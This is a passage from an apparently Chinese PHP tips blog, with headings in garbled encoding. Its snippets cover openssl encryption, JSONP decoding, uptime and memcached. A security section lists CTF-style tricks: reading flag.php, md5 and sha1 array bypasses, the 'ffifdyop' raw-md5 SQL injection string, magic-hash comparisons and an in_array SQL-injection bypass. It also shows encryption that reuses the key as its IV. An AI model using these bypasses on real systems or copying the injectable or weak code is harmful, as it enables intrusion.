class="built_in">arguments</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">            error_log($e-&gt;getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SearchService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param string $query</span></span><br><span class="line"><span class="comment">     * @param int    $limit</span></span><br><span class="line"><span class="comment">     * @param int    $offset</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @deprecated æ–¹æ³•åºŸå¼ƒ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">string $query, $limit = <span class="number">10</span>, $offset = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            [<span class="string">"id"</span> =&gt; <span class="number">1</span>, <span class="string">"aaa"</span>],</span><br><span class="line">            [<span class="string">"id"</span> =&gt; <span class="number">2</span>, <span class="string">"bbb"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PHP-7-1-ä¸­ä½¿ç”¨-openssl-å–ä»£-mcrypt"><a href="#PHP-7-1-ä¸­ä½¿ç”¨-openssl-å–ä»£-mcrypt" class="headerlink" title="PHP 7.1 ä¸­ä½¿ç”¨ openssl å–ä»£ mcrypt"></a>PHP 7.1 ä¸­ä½¿ç”¨ openssl å–ä»£ mcrypt</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†</span></span><br><span class="line"><span class="comment"> * @param string $text éœ€è¦åŠ å¯†çš„æ˜æ–‡</span></span><br><span class="line"><span class="comment"> * @return string åŠ å¯†åçš„å¯†æ–‡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$text, $appid</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        *åŸæ¥ä»£ç </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        $iv = substr($<span class="keyword">this</span>-&gt;key, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        $encrypted = openssl_encrypt($text,<span class="string">'AES-256-CBC'</span>,$<span class="keyword">this</span>-&gt;key,OPENSSL_ZERO_PADDING,$iv);</span><br><span class="line">        <span class="keyword">return</span> array(ErrorCode::$OK, $encrypted);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        <span class="comment">//print $e;</span></span><br><span class="line">        <span class="keyword">return</span> array(ErrorCode::$EncryptAESError, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†https://blog.wpjam.com/m/php-7-1-openssl/</span></span><br><span class="line"><span class="comment"> * @param string $encrypted éœ€è¦è§£å¯†çš„å¯†æ–‡</span></span><br><span class="line"><span class="comment"> * @return string è§£å¯†å¾—åˆ°çš„æ˜æ–‡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$encrypted, $appid</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $iv = substr($<span class="keyword">this</span>-&gt;key, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        $decrypted = openssl_decrypt($encrypted,<span class="string">'AES-256-CBC'</span>,$<span class="keyword">this</span>-&gt;key,OPENSSL_ZERO_PADDING,$iv);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> array(ErrorCode::$DecryptAESError, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *åŸæ¥ä»£ç </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="static-æ•ˆç‡ä¼˜åŒ–"><a href="#static-æ•ˆç‡ä¼˜åŒ–" class="headerlink" title="static æ•ˆç‡ä¼˜åŒ–"></a>static æ•ˆç‡ä¼˜åŒ–</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_some_var</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $<span class="keyword">var</span>;</span><br><span class="line">	<span class="keyword">if</span>(!isset($<span class="keyword">var</span>))&#123;</span><br><span class="line">		$<span class="keyword">var</span> = complex_calculation();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $<span class="keyword">var</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è§£ç -JSONP"><a href="#è§£ç -JSONP" class="headerlink" title="è§£ç  JSONP"></a>è§£ç  JSONP</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_decode</span>(<span class="params">$jsonp, $assoc = false</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($jsonp[<span class="number">0</span>] !== <span class="string">'['</span> &amp;&amp; $jsonp[<span class="number">0</span>] !== <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">		$jsonp = substr($jsonp, strpos($jsonp, <span class="string">'('</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> json_decode(trim($jsonp,<span class="string">'();'</span>), $assoc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="åˆå¹¶å¤šç»´æ•°ç»„ä¸­çš„å­æ•°ç»„"><a href="#åˆå¹¶å¤šç»´æ•°ç»„ä¸­çš„å­æ•°ç»„" class="headerlink" title="åˆå¹¶å¤šç»´æ•°ç»„ä¸­çš„å­æ•°ç»„"></a>åˆå¹¶å¤šç»´æ•°ç»„ä¸­çš„å­æ•°ç»„</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$merged = call_user_func_array(<span class="string">'array_merge'</span>, $result);</span><br><span class="line">$merged = array_merge(...$result);</span><br></pre></td></tr></table></figure>
<h3 id="simplexml-load-string-çš„-parser-error-é—®é¢˜"><a href="#simplexml-load-string-çš„-parser-error-é—®é¢˜" class="headerlink" title="simplexml_load_string çš„ parser error é—®é¢˜"></a>simplexml_load_string çš„ parser error é—®é¢˜</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆä½¿ç”¨å‡½æ•° libxml_use_internal_errors() å…³é—­ XML é”™è¯¯ï¼Œç„¶åä½¿ç”¨ libxml_get_errors() è·å–ç›¸å…³çš„é”™è¯¯è¿›è¡Œè‡ªå®šä¹‰å¤„ç†ã€‚</span><br><span class="line"></span><br><span class="line">libxml_use_internal_errors(<span class="literal">true</span>);</span><br><span class="line">$sxe = simplexml_load_string(<span class="string">"&lt;?xml version='1.0'&gt;&lt;broken&gt;&lt;xml&gt;&lt;/broken&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === $sxe) &#123;</span><br><span class="line">    echo <span class="string">"åŠ è½½ XML é”™è¯¯\n"</span>;</span><br><span class="line">    foreach(libxml_get_errors() <span class="keyword">as</span> $error) &#123;</span><br><span class="line">        echo <span class="string">"\t"</span>, $error-&gt;message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;åŠ è½½ XML é”™è¯¯</span><br><span class="line"> </span><br><span class="line">     Blank needed here</span><br><span class="line">     parsing XML declaration: <span class="string">'?&gt;'</span> expected</span><br><span class="line">     Opening and ending tag mismatch: xml line <span class="number">1</span> and broken</span><br><span class="line">     Premature end <span class="keyword">of</span> data <span class="keyword">in</span> tag broken line <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="å¦‚ä½•ç§»é™¤æ§åˆ¶å­—ç¬¦"><a href="#å¦‚ä½•ç§»é™¤æ§åˆ¶å­—ç¬¦" class="headerlink" title="å¦‚ä½•ç§»é™¤æ§åˆ¶å­—ç¬¦"></a>å¦‚ä½•ç§»é™¤æ§åˆ¶å­—ç¬¦</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wpjam_strip_control_characters</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">'/[\x00-\x1F\x7F-\x9F]/u'</span>, <span class="string">''</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è·å–-Linux-æœåŠ¡å™¨çš„-uptime"><a href="#è·å–-Linux-æœåŠ¡å™¨çš„-uptime" class="headerlink" title="è·å– Linux æœåŠ¡å™¨çš„ uptime"></a>è·å– Linux æœåŠ¡å™¨çš„ uptime</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$uptime = trim(shell_exec(<span class="string">'uptime'</span>));</span><br><span class="line"><span class="comment">// output is 04:47:32 up 187 days,  5:03,  1 user,  load average: 0.55, 0.55, 0.54</span></span><br><span class="line"></span><br><span class="line">$uptime = explode(<span class="string">','</span>, $uptime);</span><br><span class="line">$uptime = explode(<span class="string">' '</span>, $uptime[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">$uptime = $uptime[<span class="number">2</span>].<span class="string">' '</span>.$uptime[<span class="number">3</span>]; <span class="comment">// 187 days</span></span><br><span class="line">$uptime = trim(file_get_contents(<span class="string">'/proc/uptime'</span>));</span><br><span class="line">$uptime = explode(<span class="string">' '</span>, $uptime);</span><br><span class="line"></span><br><span class="line">echo $uptime[<span class="number">0</span>]; <span class="comment">//uptime in seconds</span></span><br></pre></td></tr></table></figure>
<h3 id="ç”¨Memcahced-çš„æ—¶å€™ï¼Œè¯·ä¸è¦æŠŠè¿‡æœŸæ—¶é—´è®¾ç½®æˆè¶…è¿‡30å¤©"><a href="#ç”¨Memcahced-çš„æ—¶å€™ï¼Œè¯·ä¸è¦æŠŠè¿‡æœŸæ—¶é—´è®¾ç½®æˆè¶…è¿‡30å¤©" class="headerlink" title="ç”¨Memcahced çš„æ—¶å€™ï¼Œè¯·ä¸è¦æŠŠè¿‡æœŸæ—¶é—´è®¾ç½®æˆè¶…è¿‡30å¤©"></a>ç”¨Memcahced çš„æ—¶å€™ï¼Œè¯·ä¸è¦æŠŠè¿‡æœŸæ—¶é—´è®¾ç½®æˆè¶…è¿‡30å¤©</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¿‡æœŸæ—¶é—´æ˜¯ä¸€ä¸ª Unix æ—¶é—´æˆ³ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªä»ç°åœ¨ç®—èµ·çš„ä»¥ç§’ä¸ºå•ä½çš„æ•°å­—ã€‚</span><br><span class="line">é‚£ä¹ˆæ€ä¹ˆåˆ¤æ–­æ˜¯ Unix æ—¶é—´æˆ³è¿˜æ˜¯ä¸€ä¸ªä»ç°åœ¨ç®—èµ·çš„ä»¥ç§’ä¸ºå•ä½çš„æ•°å­—å‘¢ï¼Ÿå°äº <span class="number">60</span>Ã—<span class="number">60</span>Ã—<span class="number">24</span>Ã—<span class="number">30</span>ï¼ˆ<span class="number">30</span>å¤©æ—¶é—´çš„ç§’æ•°ï¼‰ï¼Œå°±ç®—æ˜¯ä»ç°åœ¨ç®—èµ·çš„ä»¥ç§’ä¸ºå•ä½çš„æ•°å­—ã€‚å¦‚æœå¤§äºæœåŠ¡ç«¯ä¼šå°†å…¶ä½œä¸ºä¸€ä¸ªçœŸå®çš„Unixæ—¶é—´æˆ³æ¥å¤„ç†è€Œä¸æ˜¯è‡ªå½“å‰æ—¶é—´çš„åç§»ã€‚</span><br><span class="line">å¦‚æœè¿‡æœŸæ—¶é—´è¢«è®¾ç½®ä¸º<span class="number">0</span>ï¼ˆé»˜è®¤ï¼‰ï¼Œæ­¤å…ƒç´ æ°¸ä¸è¿‡æœŸï¼ˆä½†æ˜¯å®ƒå¯èƒ½ç”±äºæœåŠ¡ç«¯ä¸ºäº†ç»™å…¶ä»–æ–°çš„å…ƒç´ åˆ†é…ç©ºé—´è€Œè¢«åˆ é™¤ï¼‰ã€‚</span><br><span class="line">æ‰€ä»¥å¦‚æœçœŸçš„è¦è®¾ç½®ä¸€ä¸ª key çš„è¿‡æœŸæ—¶é—´ä¸ºä¸€å¹´åï¼Œå…¶å€¼åº”è¯¥è®¾ç½®ä¸ºï¼š time()+<span class="number">60</span>Ã—<span class="number">60</span>Ã—<span class="number">24</span>Ã—<span class="number">365</span>ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="json-decode-æ— æ³•è§£æ"><a href="#json-decode-æ— æ³•è§£æ" class="headerlink" title="json_decode æ— æ³•è§£æ"></a>json_decode æ— æ³•è§£æ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">'JSON.php'</span>;<span class="comment">//https://github.com/pear/Services_JSON</span></span><br><span class="line">$json = <span class="keyword">new</span> Services_JSON();</span><br><span class="line">$data = $json-&gt;decode($str);</span><br><span class="line">$json = <span class="keyword">new</span> Services_JSON(SERVICES_JSON_LOOSE_TYPE);</span><br><span class="line">$data = $json-&gt;decode($str);</span><br></pre></td></tr></table></figure>
<h3 id="cURL-æŠ¥é”™-error-60-SSL-certificate-problem"><a href="#cURL-æŠ¥é”™-error-60-SSL-certificate-problem" class="headerlink" title="cURL æŠ¥é”™ error 60 SSL certificate problem"></a>cURL æŠ¥é”™ error 60 SSL certificate problem</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å°† cacert.pem æ–‡ä»¶ä¿å­˜åœ¨å¯åˆ°è¾¾çš„ç›®æ ‡ä¸­ã€‚</span><br><span class="line">ç„¶åï¼Œåœ¨ php.ini æ–‡ä»¶ä¸­ï¼Œå‘ä¸‹æ»šåŠ¨åˆ°æ‰¾åˆ° [curl] çš„ä½ç½®ã€‚</span><br><span class="line">æ‚¨åº”è¯¥çœ‹åˆ°æ³¨é‡Šæ‰äº† CURLOPT_CAINFO é€‰é¡¹ã€‚ å–æ¶ˆæ³¨é‡Šå¹¶å°†å…¶æŒ‡å‘ cacert.pem æ–‡ä»¶ã€‚ ä½ åº”è¯¥æœ‰è¿™æ ·çš„ä¸€è¡Œï¼š</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">curl.cainfo =â€œè¯ä¹¦è·¯å¾„\cacert.pemâ€</span><br></pre></td></tr></table></figure>
<h3 id="æŒ‰å‘¨å–æ—¶é—´æ®µ"><a href="#æŒ‰å‘¨å–æ—¶é—´æ®µ" class="headerlink" title="æŒ‰å‘¨å–æ—¶é—´æ®µ"></a>æŒ‰å‘¨å–æ—¶é—´æ®µ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$start = <span class="string">'1478863624'</span>;</span><br><span class="line">$end = <span class="string">'1480505248'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getweek</span>(<span class="params">$start, $end</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = array();</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>($start &lt;= $end)&#123;</span><br><span class="line">            $ret[$i][<span class="string">'start'</span>] = date(<span class="string">'Y-m-d'</span>,$start);</span><br><span class="line">            $tmp = strtotime(<span class="string">"+6 days"</span>,$start);</span><br><span class="line">            <span class="keyword">if</span>($end &lt;= $tmp)</span><br><span class="line">                $ret[$i][<span class="string">'end'</span>] = date(<span class="string">'Y-m-d'</span>,$end);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $ret[$i][<span class="string">'end'</span>] = date(<span class="string">'Y-m-d'</span>,$tmp);</span><br><span class="line">            $i++;</span><br><span class="line">            $start = strtotime(<span class="string">"+1 day"</span>,$tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [start] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-11</span></span><br><span class="line">            [end] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-17</span></span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [start] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-18</span></span><br><span class="line">            [end] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-24</span></span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [start] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-25</span></span><br><span class="line">            [end] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-30</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
<h3 id="PHP-ä»£ç å®‰å…¨"><a href="#PHP-ä»£ç å®‰å…¨" class="headerlink" title="PHP ä»£ç å®‰å…¨"></a>PHP ä»£ç å®‰å…¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/28505</span></span><br></pre></td></tr></table></figure>
<h3 id="åŒ¿åå‡½æ•°"><a href="#åŒ¿åå‡½æ•°" class="headerlink" title="åŒ¿åå‡½æ•°"></a>åŒ¿åå‡½æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">var</span> = <span class="string">"https://6619.io"</span>;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span> (<span class="params">$var</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// echo $var;</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$param</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// echo $param;</span></span><br><span class="line">&#125;)($<span class="keyword">var</span>);</span><br></pre></td></tr></table></figure>
<h3 id="æ¯”è¾ƒå­—ç¬¦ä¸²"><a href="#æ¯”è¾ƒå­—ç¬¦ä¸²" class="headerlink" title="æ¯”è¾ƒå­—ç¬¦ä¸²"></a>æ¯”è¾ƒå­—ç¬¦ä¸²</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">åˆ—å‡ºç›®å½•https:<span class="comment">//www.restran.net/2016/09/26/php-security-notes/</span></span><br><span class="line"></span><br><span class="line">scandir(<span class="string">'/site'</span>)</span><br><span class="line">show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">var_dump(file(<span class="string">'flag.php'</span>));</span><br><span class="line">print_r(file(<span class="string">'flag.php'</span>));</span><br><span class="line">å¦‚æœ GET å‚æ•°ä¸­è®¾ç½® name[]=aï¼Œé‚£ä¹ˆ $_GET[<span class="string">'name'</span>] = [a]ï¼Œphp ä¼šæŠŠ []=a å½“æˆæ•°ç»„ä¼ å…¥ï¼Œ $_GET ä¼šè‡ªåŠ¨å¯¹å‚æ•°è°ƒç”¨ urldecodeã€‚</span><br><span class="line"></span><br><span class="line">$_POST åŒæ ·å­˜åœ¨æ­¤æ¼æ´ï¼Œæäº¤çš„è¡¨å•æ•°æ®ï¼Œuser[]=adminï¼Œ$_POST[<span class="string">'user'</span>] å¾—åˆ°çš„æ˜¯ [<span class="string">'admin'</span>] æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</span><br><span class="line">sha1([]) === <span class="literal">false</span></span><br><span class="line">md5([]) === <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">$password = <span class="string">"ffifdyop"</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE pass = '"</span>.md5($password,<span class="literal">true</span>).<span class="string">"'"</span></span><br><span class="line">b<span class="string">"SELECT * FROM admin WHERE pass = ''or'6Ã‰]â„¢Ã©!r,Ã¹Ã­b\x1C'"</span></span><br><span class="line"></span><br><span class="line"><span class="string">'0.999999999999999999999'</span> == <span class="number">1</span></span><br><span class="line"> <span class="literal">true</span> <span class="keyword">in</span> PHP <span class="number">4.3</span><span class="number">.0</span> - <span class="number">5.6</span>.x</span><br><span class="line"># false in 7.0.0+</span><br><span class="line"><span class="string">'0e0'</span> == <span class="string">'0x0'</span></span><br><span class="line"><span class="string">'0xABC'</span> == <span class="string">'0xabc'</span></span><br><span class="line"><span class="string">'0xABCdef'</span> == <span class="string">'0xabcDEF'</span></span><br><span class="line"><span class="string">'000000e1'</span> == <span class="string">'0x000000'</span></span><br><span class="line"><span class="string">'0xABFe1'</span> == <span class="string">'0xABFE1'</span></span><br><span class="line"><span class="string">'0xe'</span> == <span class="string">'0Xe'</span></span><br><span class="line"><span class="string">'0xABCDEF'</span> == <span class="string">'11259375'</span></span><br><span class="line"><span class="string">'0xABCDEF123'</span> == <span class="string">'46118400291'</span></span><br><span class="line"><span class="string">'0x1234AB'</span> == <span class="string">'1193131'</span></span><br><span class="line"><span class="string">'0x1234Ab'</span> == <span class="string">'1193131'</span></span><br><span class="line"></span><br><span class="line"># true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x</span><br><span class="line"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+</span><br><span class="line"><span class="string">'0xABCdef'</span> == <span class="string">' 0xabcDEF'</span></span><br><span class="line"><span class="string">'1e1'</span> == <span class="string">'0xa'</span></span><br><span class="line"><span class="string">'0xe'</span> == <span class="string">' 0Xe'</span></span><br><span class="line"><span class="string">'0x123'</span> == <span class="string">' 0x123'</span></span><br><span class="line"></span><br><span class="line"># true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0</span><br><span class="line"># false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+</span><br><span class="line"><span class="string">'0e0'</span> == <span class="string">'0x0a'</span></span><br><span class="line"></span><br><span class="line"># true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2</span><br><span class="line"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+</span><br><span class="line"><span class="string">'0xe'</span> == <span class="string">' 0Xe.'</span></span><br><span class="line">var_dump(is_numeric(<span class="string">"\01"</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">typeid=<span class="number">1</span>â€™ union select.. ä¹Ÿèƒ½é€šè¿‡ in_array çš„éªŒè¯</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (in_array($_GET(<span class="string">'typeid'</span>], array(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>))) &#123;</span><br><span class="line">    $sql=<span class="string">"select â€¦. where typeid="</span>.$_GET[<span class="string">'typeid'</span>]<span class="string">";</span></span><br><span class="line"><span class="string">    echo $sql;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 